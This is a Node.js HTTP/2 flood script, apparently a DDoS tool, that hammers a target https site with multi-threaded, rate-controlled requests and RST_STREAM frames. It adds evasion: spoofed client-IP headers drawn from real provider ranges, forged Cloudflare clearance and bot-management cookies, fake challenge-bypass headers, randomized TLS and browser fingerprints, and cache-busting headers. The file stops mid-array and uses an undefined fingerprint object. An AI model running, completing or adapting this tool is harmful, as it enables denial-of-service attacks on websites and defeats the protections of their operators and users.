const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

process.env.UV_THREADPOOL_SIZE = os.cpus().length;

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let statuses = {};
let rawConnections = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4]);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]);
const ratelimit = parseInt(process.argv[6]);
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 2 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--authorization');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;

if (!reqmethod || !target || !time || !threads || !ratelimit) {
    console.clear();
    console.log(`node raw.js <GET> <target> <time> <thread> <rate>
--debug - hi
--full - hello
    `);


    process.exit(1);
}
if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4);
    frameHeader.writeUInt32BE(streamId, 5);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();

function generateLegitIP() {
    const asnData = [
      { asn: "AS15169",   country: "US", ip: "8.8.8."       }, // Google
      { asn: "AS16509",   country: "US", ip: "3.120.0."     }, // Amazon
      { asn: "AS8075",    country: "US", ip: "13.107.21."   }, // Microsoft
      { asn: "AS13335",   country: "US", ip: "104.16.0."    }, // Cloudflare US
      { asn: "AS54113",   country: "US", ip: "104.244.42."  },
      { asn: "AS32934",   country: "US", ip: "157.240.0."   },
      { asn: "AS5410",    country: "US", ip: "23.235.33."   },
      { asn: "AS1653",    country: "US", ip: "152.199.19."  },
      { asn: "AS7018",    country: "US", ip: "96.44.0."     }, // AT&T
      { asn: "AS3356",    country: "US", ip: "80.239.60."   }, // Lumen / Level 3
      { asn: "AS701",     country: "US", ip: "208.80.0."    }, // Verizon example
      { asn: "AS26347",   country: "CA", ip: "64.68.0."     }, // Bell Canada (example)
      { asn: "AS577",     country: "CA", ip: "64.71.0."     }, // Rogers (example)
      { asn: "AS28573",   country: "NG", ip: "154.113.0."   }, // Actually Nigeria, but placeholder
      { asn: "AS24961",   country: "BR", ip: "2804.14.0."    },
      { asn: "AS28573",   country: "BR", ip: "45.5.0."       }, // Another Brazil
      { asn: "AS20001",   country: "AR", ip: "181.49.0."     }, // Argentina ISP (example)
      { asn: "AS28573",   country: "MX", ip: "189.225.0."    }, // Mexico ISP (example)
      { asn: "AS24940",   country: "DE", ip: "141.105.64."   }, // Hetzner DE
      { asn: "AS16276",   country: "FR", ip: "185.33.0."     }, // OVH FR
      { asn: "AS8452",    country: "NL", ip: "31.13.64."     }, // Facebook EU example
      { asn: "AS6805",    country: "GB", ip: "51.140.0."     }, // Example UK ISP
      { asn: "AS32934",   country: "IE", ip: "157.240.2."    }, // Meta in IE
      { asn: "AS9009",    country: "CH", ip: "84.211.0."     }, // Swisscom
      { asn: "AS680",     country: "SE", ip: "194.225.0."    }, // Swedish ISP (example)
      { asn: "AS3301",    country: "RU", ip: "5.8.0."        }, // Example Russia ISP
      { asn: "AS36992",   country: "ZA", ip: "41.0.0."        }, // South Africa ISP (example)
      { asn: "AS37100",   country: "KE", ip: "102.65.0."      }, // Kenya ISP (example)
      { asn: "AS36948",   country: "NG", ip: "105.112.0."     }, // Nigeria ISP
      { asn: "AS36928",   country: "EG", ip: "197.248.0."     }, // Egypt ISP (example)
      { asn: "AS29049",   country: "IL", ip: "23.222.0."      }, // Israel ISP (example)
      { asn: "AS42204",   country: "SA", ip: "2.224.0."       }, // Saudi Arabia (example)
      { asn: "AS47966",   country: "AE", ip: "94.200.0."      }, // UAE (example)
      { asn: "AS7643",    country: "VN", ip: "123.30.134."    },
      { asn: "AS18403",   country: "VN", ip: "14.160.0."      },
      { asn: "AS24086",   country: "VN", ip: "42.112.0."      },
      { asn: "AS38733",   country: "VN", ip: "103.2.224."     },
      { asn: "AS45543",   country: "VN", ip: "113.22.0."      },
      { asn: "AS7602",    country: "VN", ip: "27.68.128."     },
      { asn: "AS131127",  country: "VN", ip: "103.17.88."     },
      { asn: "AS140741",  country: "VN", ip: "103.167.198."   },
      { asn: "AS983",     country: "AU", ip: "1.1.1."         }, // example Australian prefix
      { asn: "AS7552",    country: "AU", ip: "49.255.0."      },
      { asn: "AS9829",    country: "IN", ip: "103.21.244."    },
      { asn: "AS55836",   country: "IN", ip: "103.64.0."      },
      { asn: "AS4837",    country: "CN", ip: "218.104.0."     },
      { asn: "AS9808",    country: "HK", ip: "203.81.0."      },
      { asn: "AS4528",    country: "TW", ip: "61.220.0."      },
      { asn: "AS13238",   country: "KR", ip: "13.124.0."      }, // Korea (example)
      { asn: "AS18101",   country: "TH", ip: "103.5.0."       }, // Thailand (example)
      { asn: "AS7545",    country: "MY", ip: "103.5.0."       }, // Malaysia (example)
      { asn: "AS10048",   country: "PH", ip: "202.57.32."     }, // Philippines (example)
      { asn: "AS4808",    country: "JP", ip: "153.127.0."     }, // Japan (example)
      { asn: "AS40027",   country: "US", ip: "198.41.128."     },
      { asn: "AS396982",  country: "NL", ip: "45.79.0."        }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
    const headers = {};

    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();

    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }

    return headers;
}

function generateDynamicHeaders() {
    // More realistic Chrome version progression
    const chromeVersion = getRandomInt(119, 131);
    const secChUaFullVersion = `${chromeVersion}.0.${getRandomInt(5000, 6500)}.${getRandomInt(50, 150)}`;

    const platforms = ['Windows', 'macOS', 'Linux', 'Chrome OS'];
    const architectures = ['x86', 'x86_64', 'arm', 'arm64'];

    // Platform-specific version ranges
    const platformVersions = {
        'Windows': () => ['10.0.0', '11.0.0'][Math.floor(Math.random() * 2)],
        'macOS': () => `${getRandomInt(12, 14)}.${getRandomInt(0, 6)}.${getRandomInt(0, 3)}`,
        'Linux': () => `${getRandomInt(5, 6)}.${getRandomInt(0, 19)}.0`,
        'Chrome OS': () => `${getRandomInt(14, 16)}.0.0`
    };

    const selectedPlatform = platforms[Math.floor(Math.random() * platforms.length)];
    const platformVersion = platformVersions[selectedPlatform]();

    // More realistic header order matching Chrome's actual behavior
    const headerOrder = [
        'user-agent',
        'accept',
        'accept-language',
        'accept-encoding',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-platform-version',
        'sec-ch-ua-arch',
        'sec-ch-ua-bitness',
        'sec-ch-ua-model',
        'sec-ch-ua-full-version-list',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest',
        'sec-fetch-user',
        'upgrade-insecure-requests',
        'referer',
        'dnt'
    ];

    // More realistic mobile detection
    const isMobile = fingerprint.navigator.userAgent.includes('Mobile');

    const dynamicHeaders = {
        'user-agent': fingerprint.navigator.userAgent,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': `${fingerprint.navigator.language},en-US;q=0.9,en;q=0.8`,
        'accept-encoding': 'gzip, deflate, br, zstd',
        'sec-ch-ua': fingerprint.navigator.secChUa || `"Chromium";v="${chromeVersion}", "Not(A:Brand";v="24", "Google Chrome";v="${chromeVersion}"`,
        'sec-ch-ua-mobile': isMobile ? '?1' : '?0',
        'sec-ch-ua-platform': `"${selectedPlatform}"`,
        'sec-ch-ua-platform-version': `"${platformVersion}"`,
        'sec-ch-ua-arch': `"${architectures[Math.floor(Math.random() * architectures.length)]}"`,
        'sec-ch-ua-bitness': Math.random() > 0.3 ? '"64"' : '"32"',
        'sec-ch-ua-model': isMobile ? `"${['SM-G960F', 'Pixel 7', 'iPhone'][Math.floor(Math.random() * 3)]}"` : '""',
        'sec-ch-ua-full-version-list': `"Chromium";v="${secChUaFullVersion}", "Not(A:Brand";v="24.0.0.0", "Google Chrome";v="${secChUaFullVersion}"`,
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'dnt': Math.random() > 0.7 ? '1' : undefined,
        'referer': undefined // Set dynamically based on navigation context
    };

    // Filter out undefined values and maintain order
    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key] !== undefined)
        .map(key => [key, dynamicHeaders[key]])
        .concat(Object.entries(generateAlternativeIPHeaders()));

    return orderedHeaders;
}

function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(32); // Upgraded: 16 -> 32
    const version = getRandomInt(18100, 18350); // Upgraded: 17494-17500 -> 18100-18350
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}${fingerprint.navigator?.userAgent || ''}`) // Upgraded: added userAgent
        .digest('hex')
        .substring(0, 32); // Upgraded: 16 -> 32

    const cookieParts = [
        `${clientId}`,
        `${challengeId}-${version}`,
        `${timestamp}`,
        hashPart
    ];

    return `cf_clearance=${cookieParts.join('.')}`;
}

function generateChallengeHeaders() {
    const challengeToken = randstr(64); // Upgraded: 32 -> 64
    const challengeResponse = crypto
        .createHash('sha256') // Upgraded: md5 -> sha256
        .update(`${challengeToken}${fingerprint.canvas}${fingerprint.webgl || ''}${timestamp}`) // Upgraded: added webgl
        .digest('hex');

    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 32)] // Upgraded: 16 -> 32
    ];
}

function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
            const payload = Buffer.from(JSON.stringify({ sub: randstr(8), iat: Math.floor(Date.now() / 1000) })).toString('base64url');
            const signature = crypto.createHmac('sha256', randstr(16)).update(`${header}.${payload}`).digest('base64url');
            return `Bearer ${header}.${payload}.${signature}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(16))}`;
    } else if (type.toLowerCase() === 'basic') {
        const [username, password] = value.split(':');
        if (!username || !password) return null;
        const credentials = Buffer.from(`${username.replace('%RAND%', randstr(8))}:${password.replace('%RAND%', randstr(8))}`).toString('base64');
        return `Basic ${credentials}`;
    } else if (type.toLowerCase() === 'custom') {
        return value.replace('%RAND%', randstr(16));
    }
    return null;
}

function getRandomMethod() {
    const methods = ['POST', 'HEAD', 'GET', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'CONNECT', 'TRACE'];
    return methods[Math.floor(Math.random() * methods.length)];
}

const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];

function generateJA3Fingerprint() {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'
    ];

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384'
    ];

    const curves = [
        'X25519',
        'X448',
        'secp256r1',
        'secp384r1',
        'secp521r1',
        'ffdhe2048',
        'ffdhe3072',
        'ffdhe4096',
        'ffdhe6144',
        'ffdhe8192'
    ];

    const extensions = [
        '0',
        '5',
        '10',
        '13',
        '16',
        '18',
        '21',
        '23',
        '27',
        '35',
        '43',
        '45',
        '51',
        '65281',
        '17513'
    ];

    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
    const shuffledCurves = shuffle([...curves]);
    const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 3) + 10);

    return {
        ciphers: shuffledCiphers,
        signatureAlgorithms: shuffledSigAlgs,
        curves: shuffledCurves,
        extensions: shuffledExtensions,
        padding: Math.random() > 0.3 ? getRandomInt(0, 100) : 0
    };
}

function generateHTTP2Fingerprint() {
    const settings = {
        HEADER_TABLE_SIZE: [4096, 16384],
        ENABLE_PUSH: [0, 1],
        MAX_CONCURRENT_STREAMS: [1000, 2000],
        INITIAL_WINDOW_SIZE: [65535, 262144],
        MAX_FRAME_SIZE: [16384, 65536],
        MAX_HEADER_LIST_SIZE: [8192, 32768],
        ENABLE_CONNECT_PROTOCOL: [0, 1]
    };

    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }

    return http2Settings;
}


const ja3Fingerprint = generateJA3Fingerprint();
const http2Fingerprint = generateHTTP2Fingerprint();
function generateBrowserFingerprint() {
    const screenSizes = [
        { width: 1366, height: 768 },
        { width: 1920, height: 1080 },
        { width: 2560, height: 1440 },
        { width: 414, height: 896 },
        { width: 360, height: 640 }
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9,en-US;q=0.8",
        "en-CA,en;q=0.9,fr;q=0.8",
        "en-AU,en;q=0.9",
        "es-ES,es;q=0.9,en;q=0.8",
        "es-MX,es;q=0.9,en;q=0.8",
        "es-AR,es;q=0.9,en;q=0.7",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "fr-CA,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "de-AT,de;q=0.9,en;q=0.8",
        "de-CH,de;q=0.9,fr;q=0.8,en;q=0.7",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "zh-TW,zh;q=0.9,en;q=0.8",
        "zh-HK,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "ko-KR,ko;q=0.9,en;q=0.8",
        "ru-RU,ru;q=0.9,en;q=0.8",
        "pt-BR,pt;q=0.9,en;q=0.8",
        "pt-PT,pt;q=0.9,en;q=0.8",
        "it-IT,it;q=0.9,en;q=0.8",
        "nl-NL,nl;q=0.9,en;q=0.8",
        "pl-PL,pl;q=0.9,en;q=0.8",
        "tr-TR,tr;q=0.9,en;q=0.8",
        "ar-SA,ar;q=0.9,en;q=0.8",
        "th-TH,th;q=0.9,en;q=0.8",
        "vi-VN,vi;q=0.9,en;q=0.8",
        "sv-SE,sv;q=0.9,en;q=0.8",
        "da-DK,da;q=0.9,en;q=0.8",
        "no-NO,no;q=0.9,en;q=0.8",
        "fi-FI,fi;q=0.9,en;q=0.8"
    ];

    const webGLVendors = [
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 620, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 630, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 730, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 770, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) Iris(R) Xe Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) Iris(R) Plus Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) HD Graphics 4000, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) HD Graphics 5500, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) HD Graphics 530, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) HD Graphics 620, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) Arc(TM) A770 Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) Arc(TM) A750 Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) Arc(TM) A380 Graphics, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4090, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4080, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4070 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4070, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 4060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3090 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3090, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3070, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3050, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 2080 Ti, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 2080 SUPER, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 2080, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 2070 SUPER, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 2070, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 2060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Ti, Direct3D11 vs_5_0 ps_5_0)" },
